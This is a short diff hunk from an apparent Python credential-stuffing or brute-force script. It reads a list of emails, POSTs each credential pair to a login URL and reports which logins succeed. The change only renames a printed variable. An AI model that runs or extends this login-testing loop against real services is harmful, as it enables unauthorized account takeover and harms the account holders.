@@ -13,9 +13,9 @@ with open(email,'r') as userlist:
         site = requests.post(f'{url}', data=data_payload)
         text = site.text
         if "The email or password provided is incorrect" in text:
-             print(f'Login failed: {u} {p}')
+             print(f'Login failed: {u} {password}')
         else:
-             print(f'The login is success: {u} {p}')
+             print(f'The login is success: {u} {password}')
                     
    # GLITCH422
 
